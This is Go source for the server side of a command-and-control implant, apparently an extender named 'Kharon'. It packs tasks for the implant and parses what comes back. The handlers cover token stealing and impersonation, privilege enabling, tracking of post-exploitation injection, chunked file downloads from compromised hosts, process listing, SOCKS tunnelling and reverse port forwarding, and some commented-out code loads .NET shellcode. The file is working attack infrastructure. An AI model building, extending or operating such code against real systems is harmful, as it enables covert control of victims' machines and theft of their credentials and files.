	// 	mod_content, err := os.ReadFile(fmt.Sprintf("%s/dist/extenders/agent_kharon/src_modules/postex_sc/dotnet_ldr/dotnet_assembly.x64.bin", wd))
	// 	if err != nil {
	// 		goto RET
	// 	}

		// dotnet_file := args["sc_file"].(string)

		// method_n := 0
		// switch method {
		// case "explicit":
		// 	method_n = 0x100
		// case "spawn":
		// 	method_n = 0x200
		// }

		// dotnet_content, _ := base64.StdEncoding.DecodeString(dotnet_file)

		// switch subcommand {
		// case "inline":
		// 	method_n = 0x000

		// case "spawn":
		// 	method_n = 0x200

		// case "explicit":
		// 	method_n = 0x100
		// }

	
	default:
		err = errors.New(fmt.Sprintf("Command '%v' not found", command))
		goto RET
	}

	taskData.Data, err = PackArray(array)
	if err != nil {
		goto RET
	}

	/// END CODE

	fmt.Printf("tasking command: %s | sub command: %s\n", command, subcommand)
RET:
	return taskData, messageData, err
}

func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskData, packedData []byte) []ax.TaskData {
	var outTasks []ax.TaskData

	/// START CODE
	var kharon_cfg KharonData
	
	err := kharon_cfg.Unmarshal(agentData.CustomData)
	if err != nil {
		fmt.Printf("ERROR: %v\n", err)
		return outTasks
	}

	packer := CreatePacker( packedData )

	// Print packedData
	// fmt.Printf("=== PACKED DATA DEBUG ===\n")
	// fmt.Printf("Total bytes: %d\n", len(packedData))
	// fmt.Printf("Hex dump:\n%s", hex.Dump(packedData))
	// fmt.Printf("Raw hex: %x\n", packedData)
	// fmt.Printf("========================\n\n")

	if false == packer.CheckPacker([]string{"int"}) {
		return outTasks
	}

	taskCount := packer.ParseInt32()

	for taskIndex := uint(0); taskIndex < taskCount && packer.CheckPacker([]string{"int"}); taskIndex++ {
		dataType := packer.ParseInt32()

		if dataType == uint(MSG_QUICK) || dataType == uint(MSG_OUT) { 
			if len(packer.buffer) < 16 {
				return outTasks
			}

			TaskUID := string(packer.ParsePad(36))
			if len(TaskUID) < 8 {
				return outTasks
			}
			task := taskData
			task.TaskId = TaskUID[:8]

			if dataType == 0x7 && packer.CheckPacker([]string{"int"}) {
				packer.ParseInt32() 
			}

			if false == packer.CheckPacker([]string{"int", "array"}) {
				return outTasks
			}

			outputType := packer.ParseInt32()

			switch outputType {
			case CALLBACK_ERROR:
				output := packer.ParseString()

				task.MessageType = MESSAGE_ERROR
				task.Message = ConvertCpToUTF8(output, agentData.ACP)

			case CALLBACK_SCREENSHOT:
				task.MessageType = MESSAGE_SUCCESS
				screenBuff := packer.ParseBytes()
				ts.TsScreenshotAdd(agentData.Id, "", screenBuff)
				task.Message = "Screenshot saved!"

			case CALLBACK_OUTPUT_OEM:
				output := packer.ParseString()

				task.MessageType = MESSAGE_SUCCESS
				task.ClearText = ConvertCpToUTF8(output, agentData.OemCP)

			case CALLBACK_NO_PRE_MSG:
				output := packer.ParseString()

				task.ClearText = ConvertCpToUTF8(output, agentData.ACP)

			case CALLBACK_INFO:
				task.MessageType = MESSAGE_INFO
				task.Message = packer.ParseString()
			
			default:
				output := packer.ParseString()

				task.MessageType = MESSAGE_SUCCESS
				task.ClearText = ConvertCpToUTF8(output, agentData.ACP)
			}

			task.Completed = false
			outTasks = append(outTasks, task)

		} else if dataType == uint(PROFILE_WEB) || dataType == uint(PROFILE_SMB) { // web || smb

			if false == packer.CheckPacker([]string{"array"}) {
				return outTasks
			}

			cmd_packer := CreatePacker(packer.ParseBytes())
			if cmd_packer.CheckPacker([]string{"array", "word"}) {

				TaskUID := cmd_packer.ParseString()
				if len(TaskUID) < 8 {
					continue
				}
				task := taskData
				task.TaskId = TaskUID[:8]

				commandId := int16(cmd_packer.ParseInt16())
				switch commandId {

				case TASK_JOB:
					jobCount := cmd_packer.ParseInt32()

					if jobCount > 0 {
						for i := 0; i < int(jobCount); i++ {
							jobUUID := cmd_packer.ParseString()
							jobCmdId := cmd_packer.ParseInt32()
							jobState := cmd_packer.ParseInt32()

							if i == 0 {
								// Header
								format := "%-36s   %-12s   %-10s"
								OutputText := fmt.Sprintf(format, "Job UUID", "Command ID", "State")
								OutputText += fmt.Sprintf("\n"+format, strings.Repeat("-", 36), strings.Repeat("-", 12), strings.Repeat("-", 10))
								task.ClearText = OutputText + "\n"
							}

							// Job line
							stateStr := "Unknown"
							switch jobState {
							case 0:
								stateStr = "Running"
							case 1:
								stateStr = "Completed"
							case 2:
								stateStr = "Failed"
							}

							format := "%-36s   %-12d   %-10s"
							task.ClearText += fmt.Sprintf(format, jobUUID, jobCmdId, stateStr) + "\n"
						}
					} else {
						task.ClearText = "No jobs running"
					}
				case TASK_EXIT:

					task.Message = "The agent has completed its work"
					_ = ts.TsAgentTerminate(agentData.Id, task.TaskId)
				case TASK_UPLOAD:
					// testjar := cmd_packer.ParseString()
					task.Message = "Initiated File Upload\n"

				case TASK_DOWNLOAD:
					file_id := cmd_packer.ParseString()
					status_code := cmd_packer.ParseInt32()
					if status_code != 0 {
						reason := cmd_packer.ParseString()
						task.Message = fmt.Sprintf("Download failed with error [%d]: %s", status_code, reason)
						task.MessageType = MESSAGE_ERROR
						continue
					}

					file_size := cmd_packer.ParseInt64()
					file_path := cmd_packer.ParseString()
					// file_bytes := cmd_packer.ParseBytes()

					_ = ts.TsDownloadAdd(agentData.Id, file_id, file_path, int(file_size))
					// _ = ts.TsDownloadUpdate(file_id, 1, file_bytes)

					// if params.Canceled {
					// 	task.Message = fmt.Sprintf("Download '%v' successful canceled", fileId)
					// 	_ = ts.TsDownloadClose(fileId, 4)
					// } else {
					// _ = ts.TsDownloadClose(file_id, 3)
					// }

					task.Message = "Initiated File Download\n"
					task.Message += fmt.Sprintf("File ID: %s, File Path: '%s' download initiated, size: %d bytes", file_id, file_path, file_size)

				case TASK_PROCESS_DOWNLOAD:

					fmt.Printf("Processing TASK_PROCESS_DOWNLOAD results")

					event_num := cmd_packer.ParseInt32()
					fmt.Printf("Processing %d download events\n", event_num)

					for i := 0; i < int(event_num); i++ {

						file_id := cmd_packer.ParseString()
						status_code := cmd_packer.ParseInt32()
						fmt.Printf("Processing download event for file ID: %s, status_code: %d\n", file_id, status_code)

						if status_code != 0 {
							reason := cmd_packer.ParseString()
							task.Message += fmt.Sprintf("Download failed with error [%d]: %s\n", status_code, reason)
							task.MessageType = MESSAGE_ERROR
							fmt.Printf("Deleting fileID: %d\n", file_id)

							ts.TsDownloadDelete([]string{file_id})
							continue
						}

						file_size := cmd_packer.ParseInt32()
						file_bytes := cmd_packer.ParseBytes()
						cur_chunk := cmd_packer.ParseInt32()
						total_chunks := cmd_packer.ParseInt32()

						if cur_chunk == total_chunks {
							fmt.Printf("Processing TASK_PROCESS_DOWNLOAD results - Last Chunk")

							_ = ts.TsDownloadUpdate(file_id, 1, file_bytes)
							_ = ts.TsDownloadClose(file_id, 3)
							task.Message += fmt.Sprintf("File '%s' download completed, size: %d bytes\n", file_id, file_size)
						} else {
							_ = ts.TsDownloadUpdate(file_id, 1, file_bytes)
							task.Message += fmt.Sprintf("File '%s', Chunk: %d/%d download completed, size: %d bytes\n", file_id, cur_chunk, total_chunks, file_size)
						}
					}

				case TASK_TOKEN:
					if cmd_packer.CheckPacker([]string{"byte"}) {

						subCommandId := int(cmd_packer.ParseInt8())
						switch subCommandId {

						case TOKEN_GET_UUID:
							if cmd_packer.CheckPacker([]string{"array"}) {
								task.Message = ConvertCpToUTF8(cmd_packer.ParseString(), agentData.ACP)
							}
							break

						case TOKEN_STEAL:
							if cmd_packer.CheckPacker([]string{"int"}) {
								result := cmd_packer.ParseInt32()
								if result == 0 {
									task.Message = "Token could not be stolen"
								} else {

									if cmd_packer.CheckPacker([]string{"int", "int", "array", "array", "long"}) {
										tokenId := cmd_packer.ParseInt32()
										pid := cmd_packer.ParseInt32()
										user := cmd_packer.ParseString()
										host := cmd_packer.ParseString()
										handle := cmd_packer.ParseInt64()

										task.Message = fmt.Sprintf("Token %v (handle %v) from process [%v] in host [%v] successfully stolen: %v", tokenId, handle, pid, host, user)
									}
								}
							}  

						case TOKEN_USE:
							if cmd_packer.CheckPacker([]string{"int"}) {
								result := cmd_packer.ParseInt32()
								if result == 0 {
									task.Message = "Token could not be used"
								} else {
									task.Message = "Token successfully used"
								}
							}

						case TOKEN_RM:
							if cmd_packer.CheckPacker([]string{"int"}) {
								result := cmd_packer.ParseInt32()
								if result == 0 {
									task.Message = "Token could not be removed"
								} else {
									task.Message = "Token successfully removed"
								}
							}
							break

						case TOKEN_REVERT:
							if cmd_packer.CheckPacker([]string{"int"}) {
								result := cmd_packer.ParseInt32()
								if result == 0 {
									task.Message = "Token could not be reverted"
								} else {
									task.Message = "Token successfully reverted"
								}
							}
							break

						case TOKEN_MAKE:
							if cmd_packer.CheckPacker([]string{"int"}) {
								result := cmd_packer.ParseInt32()
								if result == 0 {
									task.Message = "Token could not be created"
								} else {
									task.Message = "Token successfully created"
								}
							}
						case TOKEN_LIST:
							var list string

							list += fmt.Sprintf("\n%-12s %-35s %-25s %-18s %-12s\n",
								"Token ID", "User", "Host", "Handle", "Process ID")
							list += fmt.Sprintf("%s\n", strings.Repeat("-", 120))

							for cmd_packer.Size() > 0 {
								user := cmd_packer.ParseString()
								host := cmd_packer.ParseString()
								tkn_id := cmd_packer.ParseInt32()
								handle := cmd_packer.ParseInt64()
								ps_id := cmd_packer.ParseInt32()

								list += fmt.Sprintf("%-12d %-35s %-25s 0x%-16X %-12d\n",
									tkn_id, user, host, handle, ps_id)
							}

							if list == "" {
								task.Message = "No tokens found"
							} else {
								task.ClearText = list
							}
						case TOKEN_PRIV_GET:
							if cmd_packer.CheckPacker([]string{"int"}) {
								result := cmd_packer.ParseInt32()
								if result == 0 {
									task.Message = "Privileges could not be enabled"
								} else {
									task.Message = "Provileges successfully enabled"
								}
							}

						case TOKEN_PRIV_LIST:
							if cmd_packer.CheckPacker([]string{"int"}) {
								count := cmd_packer.ParseInt32()
								priv_len := 10

								type privelege struct {
									name string
									attr string
								}
								var privs []privelege
								for i := 0; i < int(count); i++ {
									if cmd_packer.CheckPacker([]string{"array", "int"}) {
										priv := privelege{
											name: ConvertCpToUTF8(cmd_packer.ParseString(), agentData.ACP),
										}
										status := cmd_packer.ParseInt32()
										if status == 0 {
											priv.attr = "Disabled"
										} else {
											priv.attr = "Enabled"
										}
										if len(priv.name) > priv_len {
											priv_len = len(priv.name)
										}
										privs = append(privs, priv)
									}
								}

								if len(privs) == 0 {
									task.Message = "Privileges not found"
								} else {
									task.Message = "Privileges:\n"
									for _, priv := range privs {
										format := fmt.Sprintf("%%-%vv     %%v\n", priv_len)
										task.ClearText += fmt.Sprintf(format, priv.name, priv.attr)
									}
								}
							}

						default:
							continue
						}
					}
					break

				case TASK_POSTEX:
					postex_action := cmd_packer.ParseInt32()

					switch ( postex_action ) {
					case POSTEX_ACTION_INJECT:
						success := cmd_packer.ParseInt32()
						if success == 1 {
							kharon_cfg.postex_handler.PostexLoaded = true
						} else {
							kharon_cfg.postex_handler.PostexLoaded = false
						}

						agentData.CustomData, _ = kharon_cfg.Marshal()
						ts.TsAgentUpdateData(agentData)

						taskData.Completed = false

						case POSTEX_ACTION_POLL:
						postex_msg := cmd_packer.ParseInt32()

						switch postex_msg {
						case POSTEX_MSG_OUTPUT:
							is_exit   := cmd_packer.ParseInt32()
							exit_code := cmd_packer.ParseInt32()
							output 	  := cmd_packer.ParseBytes()
							
							if is_exit == 1 {
								taskData.Completed = true
								taskData.Message     = fmt.Sprintf("Received %d bytes of output. Process exited with code %d", len(output), exit_code)
							} else {
								taskData.Message     = fmt.Sprintf("Received %d bytes of output", len(output))
							}

							taskData.MessageType = MESSAGE_INFO
							taskData.ClearText   = ConvertCpToUTF8(string(output), agentData.ACP)

						case POSTEX_MSG_RAW:
							output := cmd_packer.ParseBytes()

							taskData.Message     = fmt.Sprintf("Received %d bytes of raw output", len(output))
							taskData.MessageType = MESSAGE_INFO
							taskData.ClearText   = ConvertCpToUTF8(string(output), agentData.ACP)

							taskData.Completed = true
							
						case POSTEX_MSG_END: 
							exit_code := cmd_packer.ParseInt32()

							taskData.Message 	 = fmt.Sprintf("Process terminated with exit code: %d", exit_code)
							taskData.MessageType = MESSAGE_INFO					

							taskData.Completed = true
						}

					case POSTEX_ACTION_LIST:
					case POSTEX_ACTION_SUSPEND:
					case POSTEX_ACTION_KILL:
					case POSTEX_ACTION_RESUME:
					case POSTEX_ACTION_CLEANUP:
					}

				case TASK_EXEC_BOF:
					cmd_id := cmd_packer.ParseInt32()
					if cmd_id != 0 {
						switch int(cmd_id) {
						case FS_LIST:
							if ! cmd_packer.CheckPacker([]string{"array"}) {
								break
							}
							
							root_path := ConvertWCharBytesToUTF8(cmd_packer.ParseBytes())
							
							type ls_data struct {
								filename   string
								size       uint
								attrib     uint
								dir        bool
								createDate string
								accessDate string
								writeDate  string
							}

							var data_directory []ls_data
							var data_files []ls_data

							for cmd_packer.CheckPacker([]string{
								"array", "int", "int", "word", "word", "word", "word", "word",
								"word", "word", "word", "word", "word", "word", "word", "word",
								"word", "word", "word", "word", "word"}) {
								
								filename := ConvertWCharBytesToUTF8(cmd_packer.ParseBytes())
								
								ls_item := ls_data{
									filename:   filename,
									size:       cmd_packer.ParseInt32(),
									attrib:     cmd_packer.ParseInt32(),
									dir:        false,
									createDate: fmt.Sprintf("%02d/%02d/%d %02d:%02d:%02d", 
										cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), 
										cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16()),
									accessDate: fmt.Sprintf("%02d/%02d/%d %02d:%02d:%02d", 
										cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), 
										cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16()),
									writeDate: fmt.Sprintf("%02d/%02d/%d %02d:%02d:%02d", 
										cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), 
										cmd_packer.ParseInt16(), cmd_packer.ParseInt16(), cmd_packer.ParseInt16()),
								}
								
								if ls_item.filename != "." && ls_item.filename != ".." {
									if (ls_item.attrib & 0x10) != 0 {
										ls_item.dir = true
										data_directory = append(data_directory, ls_item)
									} else {
										data_files = append(data_files, ls_item)
									}
								}
							}
							
							data_full := append(data_directory, data_files...)
							
							var ui_items []ax.ListingFileDataWin
							
							if len(data_full) == 0 {
								task.Message = fmt.Sprintf("The '%s' directory is EMPTY", root_path)
								task.MessageType = MESSAGE_INFO
							} else {
								OutputText := fmt.Sprintf(" %-8s %-14s %-23s %-23s %-23s  %s\n", 
									"Type", "Size", "Created", "Last Access", "Last Modified", "Name")
								OutputText += fmt.Sprintf(" %-8s %-14s %-23s %-23s %-23s  %s", 
									"----", "---------", "-------------------", "-------------------", "-------------------", "----")
								
								for _, item := range data_full {
									if item.dir {
										OutputText += fmt.Sprintf("\n %-8s %-14s %-23s %-23s %-23s  %s", 
											"dir", "", item.createDate, item.accessDate, item.writeDate, item.filename)
									} else {
										OutputText += fmt.Sprintf("\n %-8s %-14s %-23s %-23s %-23s  %s", 
											"", SizeBytesToFormat(int64(item.size)), item.createDate, item.accessDate, item.writeDate, item.filename)
									}
									
									t, _ := time.Parse("01/02/2006 15:04:05", item.writeDate)
									
									fileData := ax.ListingFileDataWin{
										IsDir:    item.dir,
										Size:     int64(item.size),
										Date:     t.Unix(),
										Filename: item.filename,
									}
									ui_items = append(ui_items, fileData)
								}
								
								task.Message = fmt.Sprintf("List of files in the '%s' directory", root_path)
								task.ClearText = OutputText
								task.MessageType = MESSAGE_SUCCESS
							}
							
							SyncBrowserFiles(ts, task, root_path, ui_items)

						case PROC_LIST:
							type ps_data struct {
								imagename string
								pid       uint
								ppid      uint
								sessionid uint
								user      string
								arch      string
							}

							var ps_data_list []ps_data

							for cmd_packer.CheckPacker([]string{"array", "int", "int", "int", "array", "int"}) {
								ps_item := ps_data{
									imagename: ConvertCpToUTF8(ConvertWCharBytesToString(cmd_packer.ParseBytes()), agentData.ACP),
									pid:       cmd_packer.ParseInt32(),
									ppid:      cmd_packer.ParseInt32(),
									sessionid: cmd_packer.ParseInt32(),
									user:      ConvertCpToUTF8(ConvertWCharBytesToString(cmd_packer.ParseBytes()), agentData.ACP),
								}

								isx64 := cmd_packer.ParseInt32()
								if isx64 == 0 {
									ps_item.arch = "x64"
								} else {
									ps_item.arch = "x86"
								}

								ps_data_list = append(ps_data_list, ps_item)

								fmt.Printf("")
							}

							var proclist []ax.ListingProcessDataWin

							if len( ps_data_list ) > 0 {
								ctx_max_size := 10
								ps_max_size  := 20

								for _, item := range ps_data_list {
									proc_data := ax.ListingProcessDataWin{
										Pid:         item.pid,
										Ppid:        item.ppid,
										SessionId:   item.sessionid,
										ProcessName: item.imagename,
										Arch:        item.arch,
									}

									if item.user != "N\\A" {
										proc_data.Context = item.user

										if len( proc_data.Context ) > ctx_max_size {
											ctx_max_size = len( proc_data.Context )
										}
									}

									if len( proc_data.ProcessName ) > ps_max_size {
										ps_max_size = len( proc_data.ProcessName )
									}

									proclist = append( proclist, proc_data )
								}

								type TreeProc struct {
									Data     ps_data
									Children []*TreeProc
								}

								procMap := make(map[uint]*TreeProc)
								var roots []*TreeProc

								for _, proc := range ps_data_list {
									node := &TreeProc{Data: proc}
									procMap[proc.pid] = node
								}

								for _, node := range procMap {
									if node.Data.ppid == 0 || node.Data.pid == node.Data.ppid {
										roots = append(roots, node)
									} else if parent, ok := procMap[node.Data.ppid]; ok {
										parent.Children = append( parent.Children, node )
									} else {
										roots = append( roots, node ) 
									}
								}

								sort.Slice(roots, func(i, j int) bool {
									return roots[i].Data.pid < roots[j].Data.pid
								})

								var sortChildren func(node *TreeProc)
								sortChildren = func(node *TreeProc) {
									sort.Slice(node.Children, func(i, j int) bool {
										return node.Children[i].Data.pid < node.Children[j].Data.pid
									})
									for _, child := range node.Children {
										sortChildren(child)
									}
								}
								for _, root := range roots {
									sortChildren(root)
								}

								format := fmt.Sprintf(" %%-5v   %%-5v   %%-7v   %%-5v   %%-%vv   %%v", ctx_max_size)
								OutputText := fmt.Sprintf(format, "PID", "PPID", "Session", "Arch", "Context", "Process")
								OutputText += fmt.Sprintf("\n"+format, "---", "----", "-------", "----", "-------", "-------")

								var lines []string

								var formatTree func(node *TreeProc, prefix string, isLast bool)
								formatTree = func(node *TreeProc, prefix string, isLast bool) {
									branch := "├─ "
									if isLast {
										branch = "└─ "
									}
									treePrefix := prefix + branch
									data := node.Data

									line := fmt.Sprintf(format, data.pid, data.ppid, data.sessionid, data.arch, data.user, treePrefix+data.imagename)
									lines = append(lines, line)

									childPrefix := prefix
									if isLast {
										childPrefix += "    "
									} else {
										childPrefix += "│   "
									}

									for i, child := range node.Children {
										formatTree(child, childPrefix, i == len(node.Children)-1)
									}
								}

								for i, root := range roots {
									formatTree(root, "", i == len(roots)-1)
								}

								OutputText += "\n" + strings.Join(lines, "\n")

								fmt.Printf("output text:\n%s", OutputText)

								task.Message = "Process list:"
								task.ClearText = OutputText
								task.Completed = true
							}

							SyncBrowserProcess(ts, task, proclist)
						case PROC_RUN:
							if ( cmd_packer.CheckPacker([]string{"int", "int"}) )  {
								pid := cmd_packer.ParseInt32()
								tid := cmd_packer.ParseInt32()

								task.Message = fmt.Sprintf("Process created with pid %d and tid %d\n", pid, tid)

								if ( cmd_packer.CheckPacker([]string{"array"}) ) {
									ps_output := ConvertCpToUTF8( string(cmd_packer.ParseBytes()), agentData.ACP)

									fmt.Println(hex.Dump([]byte(ps_output)))

									task.ClearText = ps_output
								}
							}
						case TASK_CONFIG: {
							exit_code := uint(0)
							if cmd_packer.CheckPacker([]string{"int"}) {
								exit_code = cmd_packer.ParseInt32()
							}

							if exit_code == 0 {
								taskData.Message = "Config ended with success"
							} else {
								taskData.Message = fmt.Sprintf("Config ended with error") 
							}
							
							taskData.Completed = true
						}
						// case DOTNET_INLINE:
						// case DOTNET_FORK:		
						// case REFLECT_INLINE:					
						// case REFLECT_FORK:
						}
					}
					task.Completed = true

				case TASK_SOCKS:
					channelID := cmd_packer.ParseInt64()
					subCmd := cmd_packer.ParseInt64()
					result := cmd_packer.ParseInt16()
					fmt.Printf("Task_Socks - Recieved Data: channelID:%d, subCmd:%d, result: %d\n", channelID, subCmd, result)

					if channelID != 0 {
						if subCmd == COMMAND_TUNNEL_START_TCP {
							if result == 0 {
								ts.TsTunnelConnectionClose(int(channelID), false)
							} else {
								ts.TsTunnelConnectionResume(agentData.Id, int(channelID), false)
							}
						}
					}

				case TASK_PROCESS_TUNNEL:

					numEvents_COMMAND_TUNNEL_ACCEPT := cmd_packer.ParseInt32()
					if numEvents_COMMAND_TUNNEL_ACCEPT > 0 {
						fmt.Printf(" TASK_PROCESS_TUNNEL - numEvents_COMMAND_TUNNEL_ACCEPT: %d\n", numEvents_COMMAND_TUNNEL_ACCEPT)
					}

					for i := 0; i < int(numEvents_COMMAND_TUNNEL_ACCEPT); i++ {
						tunnelID := cmd_packer.ParseInt32()
						subCmd := cmd_packer.ParseInt32()
						fmt.Printf("Recieved Data: tunnelID:%d, subCmd:%d\n", tunnelID, subCmd)
						if tunnelID != 0 {
							if subCmd == COMMAND_TUNNEL_ACCEPT {
								revChannelID := cmd_packer.ParseInt32()
								fmt.Printf("Recieved Data: tunnelID:%d, revChannelID:%d\n", tunnelID, revChannelID)
								ts.TsTunnelConnectionAccept(int(tunnelID), int(revChannelID))
							}
						}
					}

					numEvents_COMMAND_TUNNEL_START_TCP := cmd_packer.ParseInt32()
					if numEvents_COMMAND_TUNNEL_START_TCP > 0 {
						fmt.Printf(" TASK_PROCESS_TUNNEL - numEvents_COMMAND_TUNNEL_START_TCP: %d\n", numEvents_COMMAND_TUNNEL_START_TCP)
					}

					for i := 0; i < int(numEvents_COMMAND_TUNNEL_START_TCP); i++ {
						channelID := cmd_packer.ParseInt32()
						subCmd := cmd_packer.ParseInt32()
						fmt.Printf("Recieved Data: channelID:%d, subCmd:%d\n", channelID, subCmd)
						if channelID != 0 {
							if subCmd == COMMAND_TUNNEL_START_TCP {
								result := cmd_packer.ParseInt32()
								if result == 0 {
									ts.TsTunnelConnectionClose(int(channelID), false)
								} else {
									ts.TsTunnelConnectionResume(agentData.Id, int(channelID), false)
								}
							}
						}
					}

					numEvents_COMMAND_TUNNEL_WRITE_TCP := cmd_packer.ParseInt32()
					if numEvents_COMMAND_TUNNEL_WRITE_TCP > 0 {
						fmt.Printf("numEvents_COMMAND_TUNNEL_WRITE_TCP: %d\n", numEvents_COMMAND_TUNNEL_WRITE_TCP)
					}

					for i := 0; i < int(numEvents_COMMAND_TUNNEL_WRITE_TCP); i++ {
						channelID := cmd_packer.ParseInt32()
						subCmd := cmd_packer.ParseInt32()
						fmt.Printf("Recieved Data: channelID:%d, subCmd:%d\n", int(channelID), subCmd)
						if channelID != 0 {
							if subCmd == COMMAND_TUNNEL_WRITE_TCP {
								data := cmd_packer.ParseBytes()
								datalen := cmd_packer.ParseInt32()

								fmt.Printf("COMMAND_TUNNEL_WRITE_TCP: DATA LEN: %d\n", datalen)
								// Print packedData
								fmt.Printf("=== PACKED DATA DEBUG ===\n")
								fmt.Printf("Total bytes: %d\n", len(data))
								fmt.Printf("Hex dump:\n%s", hex.Dump(data))
								fmt.Printf("Raw hex: %x\n", data)
								fmt.Printf("========================\n\n")
								ts.TsTunnelConnectionData(int(channelID), data)
							}
						}
					}

				case TASK_RPORTFWD:
					var err error
					channelID := cmd_packer.ParseInt64()
					subCmd := cmd_packer.ParseInt64()
					result := cmd_packer.ParseInt16()
					fmt.Printf("TASK_RPORTFWD - Recieved Data: channelID:%d, subCmd:%d, result: %d\n", channelID, subCmd, result)

					if channelID != 0 {
						if subCmd == COMMAND_TUNNEL_REVERSE {
							if result == 0 {
								task.TaskId, task.Message, err = ts.TsTunnelUpdateRportfwd(int(channelID), false)
							} else {
								task.TaskId, task.Message, err = ts.TsTunnelUpdateRportfwd(int(channelID), true)
							}
							if err != nil {
								task.MessageType = MESSAGE_ERROR
							} else {
								task.MessageType = MESSAGE_SUCCESS
							}
						}
					}

				case TASK_ERROR:
					if cmd_packer.CheckPacker([]string{"int"}) {
						errorCode := cmd_packer.ParseInt32()
						// errorMessage := cmd_packer.ParseString()
						task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, win32ErrorCodes[errorCode])
						task.MessageType = MESSAGE_ERROR
					}
					break

				default:
					continue
				}

				outTasks = append(outTasks, task)
			}
		}
	}

	/// END CODE

	return outTasks
}

/// TUNNELS

func TunnelCreateTCP(channelId int, address string, port int) ([]byte, error) {

	protocol := "tcp"
	startFlag := 0

	array := []interface{}{TASK_SOCKS, int(startFlag), protocol, int(channelId), address, int(port)}

	fmt.Printf("TunnelCreateTCP\n")
	packedData, err := PackArray(array)

	if err != nil {
		goto RET
	}

RET:
	return packedData, err

	// return nil, errors.New("Function TCP Tunnel not supported")

}

func TunnelCreateUDP(channelId int, address string, port int) ([]byte, error) {
	return nil, errors.New("Function UDP Tunnel not supported")
}

func TunnelWriteTCP(channelId int, data []byte) ([]byte, error) {
	protocol := "tcp"
	startFlag := 1
	lenBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(lenBytes, uint32(len(data)))
	result := append(lenBytes, data...)

	array := []interface{}{TASK_SOCKS, int(startFlag), protocol, int(channelId), int(len(data)), result}

	fmt.Printf("TunnelWriteTCP\n")
	packedData, err := PackArray(array)

	if err != nil {
		goto RET
	}

RET:
	return packedData, err
}

func TunnelWriteUDP(channelId int, data []byte) ([]byte, error) {
	return nil, errors.New("Function UDP Tunnel not supported")
}

func TunnelClose(channelId int) ([]byte, error) {
	startFlag := 2

	array := []interface{}{TASK_SOCKS, int(startFlag), int(channelId)}

	fmt.Printf("TunnelClose\n")
	packedData, err := PackArray(array)

	if err != nil {
		goto RET
	}

RET:
	return packedData, err

}

func TunnelReverse(tunnelId int, port int) ([]byte, error) {

	array := []interface{}{TASK_RPORTFWD, int(tunnelId), int(port)}

	fmt.Printf("TunnelReverse\n")
	packedData, err := PackArray(array)

	if err != nil {
		goto RET
	}

RET:
	return packedData, err
	// return nil, errors.New("Function TCP Tunnel not supported")

}

/// TERMINAL

func TerminalStart(terminalId int, program string, sizeH int, sizeW int) ([]byte, error) {
	return nil, errors.New("Function Remote Terminal not supported")
}

func TerminalWrite(terminalId int, data []byte) ([]byte, error) {
	return nil, errors.New("Function Remote Terminal not supported")
}

func TerminalClose(terminalId int) ([]byte, error) {
	return nil, errors.New("Function Remote Terminal not supported")
}
 